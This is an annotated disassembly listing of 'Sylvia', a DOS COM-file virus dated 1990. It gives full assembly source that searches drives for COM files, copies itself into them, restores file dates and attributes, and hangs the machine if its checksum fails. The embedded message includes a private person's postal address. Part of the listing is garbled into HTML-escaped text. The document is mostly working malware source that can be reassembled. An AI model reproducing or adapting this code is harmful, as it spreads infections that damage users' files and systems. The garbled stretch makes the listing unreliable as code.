


PAGE  59,132

;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ								         ÛÛ
;ÛÛ			        SYLVIA				         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛ      Created:   5-Nov-90					         ÛÛ
;ÛÛ      Version:						         ÛÛ
;ÛÛ      Passes:    9	       Analysis Options on: QRS		         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

data_1e		equ	0			; (84E4:0000=0)

seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a


		org	100h

sylvia		proc	far

start:
		jmp	loc_1			; (02F4)
data_3		dw	808h			;  xref 84E4:02F4, 044C
		db	 08h, 54h, 68h, 69h, 73h, 07h
		db	 0Ah, 70h, 72h
data_4		db	6Fh
		db	 67h, 72h, 61h, 6Dh, 07h, 0Ah
		db	 69h, 73h, 07h
		db	0Ah, 'infected'

		db	 07h, 0Ah, 62h, 79h, 07h, 0Ah
		db	 61h, 07h
		db	0Ah, 'HARMLESS'

		db	7
		db	0Ah, 'Text-Virus V2.1'


		db	7
		db	0Dh, 0Ah, 0Dh, 0Ah, 'Send a FUNNY'


		db	' postcard to : Sylvia Verkade,', 0Dh





		db	0Ah, ' '
		db	26 dup (20h)
		db	'Duinzoom 36b,', 0Dh, 0Ah, ' '


		db	26 dup (20h)
		db	'3235 CD Rockanje', 0Dh, 0Ah, ' '



		db	26 dup (20h)
		db	'The Netherlands.', 0Dh, 0Ah, 0Dh



		db	0Ah, 'You might get an ANTIVIRUS '




		db	'program.....', 0Dh, 0Ah


		db	1Ah
data_8		db	'„q', 7Fh, 'w', 1Eh, 'e{q', 1Eh, 'z'	; Data table (indexed access)
						;  xref 84E4:0310, 0318, 0322, 0327

		db	'}yp', 1Eh, 1Dh, 1Dh, 1Dh, 1Dh, 'C'

		db	'9898OEORaY', 1Eh, 'V]ZRab', 1Ch, 1Ch



		db	1Ch, '"¾'
data_10		dw	615h			;  xref 84E4:037A, 049D
		db	0BFh, 00h, 01h,0B9h
data_11		dw	10h			;  xref 84E4:049A, 0516, 0530
		db	0FCh,0F3h,0A4h, 31h,0C0h, 89h
		db	0C3h, 89h,0C1h, 89h,0C2h, 89h
		db	0C6h, 89h,0C7h, 89h,0C5h,0B8h
		db	 00h, 01h,0FFh,0E0h
data_12		dw	515h			;  xref 84E4:0376, 04D0, 04E0
data_13		dw	1Fh			;  xref 84E4:0546, 0556
data_14		dw	625h			;  xref 84E4:032C, 04A1
data_15		dw	5			;  xref 84E4:0422, 0425, 043C, 0468
						;            0475, 048B, 04EE, 04FB
						;            051B, 0573
data_16		dw	6			;  xref 84E4:04C9, 04CC, 04E6, 052B
						;            0542, 0563, 057B
data_17		dw	1F4Dh			;  xref 84E4:0370, 050E, 05D2
data_18		dw	0A15h			;  xref 84E4:032F, 035B, 036B, 0600
data_19		dw	9090h			;  xref 84E4:0440, 044F
data_20		db	'IBMBIO.COM', 0		;  xref 84E4:03EA

		db	'IBMDOS.COM', 0

		db	'COMMAND.COM'

		db	0
data_23		dw	3			;  xref 84E4:0334, 045C, 0460
data_24		dw	0D76h			;  xref 84E4:0342, 05F4
data_25		dw	556h			;  xref 84E4:033E, 05EF
		db	 5Ch, 00h
data_26		dw	0FFFFh			;  xref 84E4:0380, 05B9, 05C3
data_27		db	0			;  xref 84E4:0387, 05C8
data_28		db	81h			;  xref 84E4:04B0, 0594
		db	0A7h, 35h, 00h
data_29		db	3Eh			; Data table (indexed access)
						;  xref 84E4:039A, 03A1, 03AB, 03BA
						;            03C1, 03D3, 03DA
		db	 42h, 57h, 63h, 61h, 14h, 38h
		db	 41h, 3Ah, 5Ch, 2Ah, 2Eh, 2Ah
		db	 00h, 43h, 3Ah, 00h, 44h, 3Ah
		db	 43h, 4Fh, 4Dh, 00h, 45h, 58h
		db	 45h, 00h
data_30		db	1			;  xref 84E4:0390
		db	8 dup (3Fh)
		db	 43h, 4Fh, 4Dh, 07h, 03h, 00h
		db	 00h, 00h, 50h,0B8h, 4Fh, 00h
data_32		db	20h			;  xref 84E4:05A9
data_33		dw	0AD6Fh			;  xref 84E4:0567
data_34		dw	1565h			;  xref 84E4:056C
data_35		dw	10h			;  xref 84E4:0482, 0496
data_36		dw	0			;  xref 84E4:0479
data_37		db	'BAIT16.COM', 0		;  xref 84E4:03E7, 03F7, 0407, 0414
						;            04A6, 0583, 05A2

		db	0, 0, 0
loc_1:						;  xref 84E4:0100
		mov	si,offset data_3	; (84E4:0103=8)
		xor	cx,cx			; Zero register
		xor	ax,ax			; Zero register
loc_2:						;  xref 84E4:0302
		lodsb				; String [si] to al
		cmp	al,1Ah
		je	loc_3			; Jump if equal
		add	cx,ax
		jmp	short loc_2		; (02FB)
loc_3:						;  xref 84E4:02FE
		cmp	cx,46A3h
		jne	loc_4			; Jump if not equal
		jmp	short loc_7		; (032C)
		db	90h
loc_4:						;  xref 84E4:0308
		mov	si,data_1e		; (84E4:0000=0)
loc_5:						;  xref 84E4:031F
		mov	al,byte ptr data_8[si]	; (84E4:0224=84h)
		sub	al,5
		xor	al,39h			; '9'
		mov	byte ptr data_8[si],al	; (84E4:0224=84h)
		inc	si
		cmp	al,24h			; '$'
		jne	loc_5			; Jump if not equal
		clc				; Clear carry flag
		mov	dx,offset data_8	; (84E4:0224=84h)
		mov	ah,9
		int	21h			; DOS Services  ah=function 09h
						;  display char string at ds:dx
loc_6:						;  xref 84E4:0329
		jmp	short loc_6		; (0329)
		db	0C3h
loc_7:						;  xref 84E4:030A
		mov	ax,data_14		; (84E4:0270=625h)
		mov	data_18,ax		; (84E4:0278=0A15h)
		xor	ax,ax			; Zero register
		mov	data_23,ax		; (84E4:029E=3)
		push	es
		mov	ah,35h			; '5'
		mov	al,24h			; '$'
		int	21h			; DOS Services  ah=function 35h
						;  get intrpt vector al in es:bx
		mov	data_25,bx		; (84E4:02A2=556h)
		mov	data_24,es		; (84E4:02A0=0D76h)
		pop	es
		mov	al,24h			; '$'
		mov	dx,offset int_24h_entry
		mov	ah,25h			; '%'
		int	21h			; DOS Services  ah=function 25h
						;  set intrpt vector al to ds:dx
		mov	bx,1000h
		mov	ah,4Ah			; 'J'
		int	21h			; DOS Services  ah=function 4Ah
						;  change mem allocation, bx=siz
		jnc	loc_8			; Jump if carry=0
		push	cs
		pop	ds
		mov	ax,data_18		; (84E4:0278=0A15h)
		jmp	ax			;*Register jump
loc_8:						;  xref 84E4:0357
		mov	bx,1000h
		mov	ah,48h			; 'H'
		int	21h			; DOS Services  ah=function 48h
						;  allocate memory, bx=bytes/16
		jnc	loc_9			; Jump if carry=0
		push	cs
		pop	ds
		mov	ax,data_18		; (84E4:0278=0A15h)
		jmp	ax			;*Register jump
loc_9:						;  xref 84E4:0367
		mov	data_17,ax		; (84E4:0276=1F4Dh)
		mov	ax,100h
		add	ax,data_12		; (84E4:026C=515h)
		mov	data_10,ax		; (84E4:024E=615h)
		mov	ax,0FFFFh
		mov	data_26,ax		; (84E4:02A6=0FFFFh)
		mov	ah,19h
		int	21h			; DOS Services  ah=function 19h
						;  get default drive al  (0=a:)
		mov	data_27,al		; (84E4:02A8=0)
		mov	ah,0Eh
		mov	dl,2
		int	21h			; DOS Services  ah=function 0Eh
						;  set default drive dl  (0=a:)
		mov	dx,offset data_30	; (84E4:02C8=1)
		mov	ah,1Ah
		int	21h			; DOS Services  ah=function 1Ah
						;  set DTA to ds:dx
loc_10:						;  xref 84E4:05CF
		mov	si,data_1e		; (84E4:0000=0)
loc_11:						;  xref 84E4:03A9
		mov	al,cs:data_29[si]	; (84E4:02AD=3Eh)
		sub	al,14h
		mov	cs:data_29[si],al	; (84E4:02AD=3Eh)
		inc	si
		cmp	al,24h			; '$'
		jne	loc_11			; Jump if not equal
		mov	dx,offset data_29	; (84E4:02AD=3Eh)
		mov	cx,7
		mov	ah,4Eh			; 'N'
		int	21h			; DOS Services  ah=function 4Eh
						;  find 1st filenam match @ds:dx
		jnc	loc_13			; Jump if carry=0
		mov	si,data_1e		; (84E4:0000=0)
loc_12:						;  xref 84E4:03C9
		mov	al,cs:data_29[si]	; (84E4:02AD=3Eh)
		add	al,14h
		mov	cs:data_29[si],al	; (84E4:02AD=3Eh)
		inc	si
		cmp	al,38h			; '8'
		jne	loc_12			; Jump if not equal
		push	cs
		pop	ds
		jmp	loc_39			; (05B9)
loc_13:						;  xref 84E4:03B5
		mov	si,data_1e		; (84E4:0000=0)
loc_14:						;  xref 84E4:03E2
		mov	al,cs:data_29[si]	; (84E4:02AD=3Eh)
		add	al,14h
		mov	cs:data_29[si],al	; (84E4:02AD=3Eh)
		inc	si
		cmp	al,38h			; '8'
		jne	loc_14			; Jump if not equal
loc_15:						;  xref 84E4:05B6
		mov	cx,0Ah
		mov	si,offset data_37	; (84E4:02E6=42h)
		mov	di,offset data_20	; (84E4:027C=49h)
		repe	cmpsb			; Rep zf=1+cx >0 Cmp [si] to es:[di]
		jnz	loc_16			; Jump if not zero
		jmp	loc_38			; (05B0)
loc_16:						;  xref 84E4:03EF
		mov	cx,0Ah
		mov	si,offset data_37	; (84E4:02E6=42h)
		mov	di,offset data_20+0Bh	; (84E4:0287=49h)
		repe	cmpsb			; Rep zf=1+cx >0 Cmp [si] to es:[di]
		jnz	loc_17			; Jump if not zero
		jmp	loc_38			; (05B0)
loc_17:						;  xref 84E4:03FF
		mov	cx,0Ah
		mov	si,offset data_37	; (84E4:02E6=42h)
		mov	di,offset data_20+16h	; (84E4:0292=43h)
		repe	cmpsb			; Rep zf=1+cx >0 Cmp [si] to es:[di]
		jnz	loc_18			; Jump if not zero
		jmp	loc_38			; (05B0)
loc_18:						;  xref 84E4:040F
		mov	dx,offset data_37	; (84E4:02E6=42h)
		mov	al,0
		mov	ah,3Dh			; '='
		int	21h			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		jnc	loc_19			; Jump if carry=0
		jmp	loc_39			; (05B9)
loc_19:						;  xref 84E4:041D
		mov	data_15,ax		; (84E4:0272=5)
		mov	bx,data_15		; (84E4:0272=5)
		mov	al,0
		xor	cx,cx			; Zero register
		mov	dx,3
		mov	ah,42h			; 'B'
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
		jnc	loc_20			; Jump if carry=0
		jmp	loc_39			; (05B9)
loc_20:						;  xref 84E4:0434
		mov	cx,2
		mov	bx,data_15		; (84E4:0272=5)
		mov	dx,offset data_19	; (84E4:027A=90h)
		mov	ah,3Fh			; '?'
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, cx=bytes, to ds:dx
		jnc	loc_21			; Jump if carry=0
		jmp	loc_39			; (05B9)
loc_21:						;  xref 84E4:0447
		mov	ax,data_3		; (84E4:0103=808h)
		cmp	ax,data_19		; (84E4:027A=9090h)
		jne	loc_22			; Jump if not equal
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		jmp	loc_38			; (05B0)
loc_22:						;  xref 84E4:0453
		mov	ax,data_23		; (84E4:029E=3)
		inc	ax
		mov	data_23,ax		; (84E4:029E=3)
		cmp	ax,5
		jb	loc_23			; Jump if below
		mov	bx,data_15		; (84E4:0272=5)
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		push	cs
		pop	ds
		jmp	loc_39			; (05B9)
loc_23:						;  xref 84E4:0466
		mov	bx,data_15		; (84E4:0272=5)
		mov	ax,cs:data_36		; (84E4:02E4=0)
		cmp	ax,0
		jne	loc_24			; Jump if not equal
		mov	ax,cs:data_35		; (84E4:02E2=10h)
		cmp	ax,7530h
		jbe	loc_25			; Jump if below or =
loc_24:						;  xref 84E4:0480
		mov	bx,data_15		; (84E4:0272=5)
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		jmp	loc_38			; (05B0)
loc_25:						;  xref 84E4:0489
		mov	ax,cs:data_35		; (84E4:02E2=10h)
		mov	data_11,ax		; (84E4:0254=10h)
		add	ax,data_10		; (84E4:024E=615h)
		mov	data_14,ax		; (84E4:0270=625h)
		mov	ah,43h			; 'C'
		mov	dx,offset data_37	; (84E4:02E6=42h)
		mov	al,1
		mov	cx,0
		int	21h			; DOS Services  ah=function 43h
						;  get/set file attrb, nam@ds:dx
		mov	dx,offset data_28	; (84E4:02A9=81h)
		mov	al,0
		mov	ah,43h			; 'C'
		int	21h			; DOS Services  ah=function 43h
						;  get/set file attrb, nam@ds:dx
		jc	loc_26			; Jump if carry Set
		jmp	short loc_27		; (04C4)
		db	90h
loc_26:						;  xref 84E4:04B9
		sub	cx,cx
		mov	ah,3Ch			; '<' int="" 21h="" ;="" dos="" services="" ah="function" 3ch="" ;="" create/truncate="" file="" @="" ds:dx="" loc_27:="" ;="" xref="" 84e4:04bb="" jnc="" loc_28="" ;="" jump="" if="" carry="0" jmp="" loc_39="" ;="" (05b9)="" loc_28:="" ;="" xref="" 84e4:04c4="" mov="" data_16,ax="" ;="" (84e4:0274="6)" mov="" bx,data_16="" ;="" (84e4:0274="6)" mov="" cx,data_12="" ;="" (84e4:026c="515h)" mov="" dx,offset="" ds:[100h]="" ;="" (84e4:0100="0E9h)" mov="" ah,40h="" ;="" '@'="" int="" 21h="" ;="" dos="" services="" ah="function" 40h="" ;="" write="" file="" cx="bytes," to="" ds:dx="" jnc="" loc_29="" ;="" jump="" if="" carry="0" jmp="" loc_39="" ;="" (05b9)="" loc_29:="" ;="" xref="" 84e4:04db="" cmp="" ax,data_12="" ;="" (84e4:026c="515h)" je="" loc_30="" ;="" jump="" if="" equal="" mov="" bx,data_16="" ;="" (84e4:0274="6)" mov="" ah,3eh="" ;="" '="">'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		mov	bx,data_15		; (84E4:0272=5)
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		push	cs
		pop	ds
		jmp	loc_39			; (05B9)
loc_30:						;  xref 84E4:04E4
		mov	bx,data_15		; (84E4:0272=5)
		mov	al,0
		sub	cx,cx
		sub	dx,dx
		mov	ah,42h			; 'B'
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
		jnc	loc_31			; Jump if carry=0
		jmp	loc_39			; (05B9)
loc_31:						;  xref 84E4:0509
		mov	dx,data_17		; (84E4:0276=1F4Dh)
		push	dx
		pop	ds
		xor	dx,dx			; Zero register
		mov	cx,cs:data_11		; (84E4:0254=10h)
		mov	bx,cs:data_15		; (84E4:0272=5)
		mov	ah,3Fh			; '?'
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, cx=bytes, to ds:dx
		jnc	loc_32			; Jump if carry=0
		push	cs
		pop	ds
		jmp	loc_39			; (05B9)
loc_32:						;  xref 84E4:0524
		mov	bx,cs:data_16		; (84E4:0274=6)
		mov	cx,cs:data_11		; (84E4:0254=10h)
		xor	dx,dx			; Zero register
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx
		jnc	loc_33			; Jump if carry=0
		jmp	short loc_39		; (05B9)
		db	90h
loc_33:						;  xref 84E4:053B
		push	cs
		pop	ds
		mov	bx,data_16		; (84E4:0274=6)
		mov	cx,data_13		; (84E4:026E=1Fh)
		mov	dx,offset data_8+29h	; (84E4:024D=0BEh)
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx
		jnc	loc_34			; Jump if carry=0
		jmp	short loc_39		; (05B9)
		db	90h
loc_34:						;  xref 84E4:0551
		cmp	ax,data_13		; (84E4:026E=1Fh)
		je	loc_35			; Jump if equal
		jmp	short loc_39		; (05B9)
		db	90h
loc_35:						;  xref 84E4:055A
		mov	ah,57h			; 'W'
		mov	al,1
		mov	bx,data_16		; (84E4:0274=6)
		mov	cx,cs:data_33		; (84E4:02DE=0AD6Fh)
		mov	dx,cs:data_34		; (84E4:02E0=1565h)
		int	21h			; DOS Services  ah=function 57h
						;  get/set file date & time
		mov	bx,data_15		; (84E4:0272=5)
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		mov	bx,data_16		; (84E4:0274=6)
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		mov	dx,offset data_37	; (84E4:02E6=42h)
		mov	ah,41h			; 'A'
		int	21h			; DOS Services  ah=function 41h
						;  delete file, name @ ds:dx
		jnc	loc_36			; Jump if carry=0
		jmp	short loc_39		; (05B9)
		db	90h
loc_36:						;  xref 84E4:058A
		mov	dx,2E6h
		push	dx
		pop	di
		mov	dx,offset data_28	; (84E4:02A9=81h)
		mov	ah,56h			; 'V'
		int	21h			; DOS Services  ah=function 56h
						;  rename file @ds:dx to @es:di
		jnc	loc_37			; Jump if carry=0
		jmp	short loc_39		; (05B9)
		db	90h
loc_37:						;  xref 84E4:059B
		mov	ah,43h			; 'C'
		mov	dx,offset data_37	; (84E4:02E6=42h)
		mov	al,1
		xor	ch,ch			; Zero register
		mov	cl,cs:data_32		; (84E4:02DD=20h)
		int	21h			; DOS Services  ah=function 43h
						;  get/set file attrb, nam@ds:dx
loc_38:						;  xref 84E4:03F1, 0401, 0411, 0459
						;            0493
		mov	ah,4Fh			; 'O'
		int	21h			; DOS Services  ah=function 4Fh
						;  find next filename match
		jc	loc_39			; Jump if carry Set
		jmp	loc_15			; (03E4)
loc_39:						;  xref 84E4:03CD, 041F, 0436, 0449
						;            0472, 04C6, 04DD, 04F8
						;            050B, 0528, 053D, 0553
						;            055C, 058C, 059D, 05B4
		mov	ax,data_26		; (84E4:02A6=0FFFFh)
		cmp	ax,0FFFFh
		jne	loc_40			; Jump if not equal
		xor	ax,ax			; Zero register
		mov	data_26,ax		; (84E4:02A6=0FFFFh)
		mov	ah,0Eh
		mov	dl,cs:data_27		; (84E4:02A8=0)
		int	21h			; DOS Services  ah=function 0Eh
						;  set default drive dl  (0=a:)
		jmp	loc_10			; (0397)
loc_40:						;  xref 84E4:05BF
		mov	ax,data_17		; (84E4:0276=1F4Dh)
		mov	es,ax
		mov	ah,49h			; 'I'
		int	21h			; DOS Services  ah=function 49h
						;  release memory block, es=seg
		jnc	loc_41			; Jump if carry=0
loc_41:						;  xref 84E4:05DB
		mov	ah,4Ah			; 'J'
		push	cs
		pop	es
		mov	bx,0FFFFh
		int	21h			; DOS Services  ah=function 4Ah
						;  change mem allocation, bx=siz
		jnc	loc_42			; Jump if carry=0
		mov	ah,4Ah			; 'J'
		int	21h			; DOS Services  ah=function 4Ah
						;  change mem allocation, bx=siz
loc_42:						;  xref 84E4:05E6
		push	ds
		mov	al,24h			; '$'
		mov	dx,cs:data_25		; (84E4:02A2=556h)
		mov	ds,cs:data_24		; (84E4:02A0=0D76h)
		mov	ah,25h			; '%'
		int	21h			; DOS Services  ah=function 25h
						;  set intrpt vector al to ds:dx
		pop	ds
		push	cs
		pop	ds
		mov	ax,data_18		; (84E4:0278=0A15h)
		jmp	ax			;*
		mov	al,3
		iret				; Interrupt return
		db	0E9h,0F3h, 03h
		db	10 dup (90h)
		db	0EBh, 04h, 90h, 90h, 90h, 90h
		db	0B4h, 4Ch,0A0h, 0Eh, 01h,0CDh
		db	 21h, 00h, 00h, 00h,0BEh, 15h
		db	 06h,0BFh, 00h, 01h,0B9h, 10h
		db	 00h,0FCh,0F3h,0A4h, 31h,0C0h
		db	 89h,0C3h, 89h,0C1h, 89h,0C2h
		db	 89h,0C6h, 89h,0C7h, 89h,0C5h
		db	0B8h, 00h, 01h,0FFh,0E0h

sylvia		endp

seg_a		ends



		end	start

±±±±±±±±±±±±±±±±±±±± CROSS REFERENCE - KEY ENTRY POINTS ±±±±±±±±±±±±±±±±±±±

    seg:off    type	   label
   ---- ----   ----   ---------------
   84E4:0100   far    start
   84E4:0612   far    int_24h_entry

 ±±±±±±±±±±±±±±±±±± Interrupt Usage Synopsis ±±±±±±±±±±±±±±±±±±

        Interrupt 21h :	 display char string at ds:dx
        Interrupt 21h :	 set default drive dl  (0=a:)
        Interrupt 21h :	 get default drive al  (0=a:)
        Interrupt 21h :	 set DTA to ds:dx
        Interrupt 21h :	 set intrpt vector al to ds:dx
        Interrupt 21h :	 get intrpt vector al in es:bx
        Interrupt 21h :	 create/truncate file @ ds:dx
        Interrupt 21h :	 open file, al=mode,name@ds:dx
        Interrupt 21h :	 close file, bx=file handle
        Interrupt 21h :	 read file, cx=bytes, to ds:dx
        Interrupt 21h :	 write file cx=bytes, to ds:dx
        Interrupt 21h :	 delete file, name @ ds:dx
        Interrupt 21h :	 move file ptr, cx,dx=offset
        Interrupt 21h :	 get/set file attrb, nam@ds:dx
        Interrupt 21h :	 allocate memory, bx=bytes/16
        Interrupt 21h :	 release memory block, es=seg
        Interrupt 21h :	 change mem allocation, bx=siz
        Interrupt 21h :	 find 1st filenam match @ds:dx
        Interrupt 21h :	 find next filename match
        Interrupt 21h :	 rename file @ds:dx to @es:di
        Interrupt 21h :	 get/set file date & time

 ±±±±±±±±±±±±±±±±±± I/O	Port Usage Synopsis  ±±±±±±±±±±±±±±±±±±

        No I/O ports used.


</'>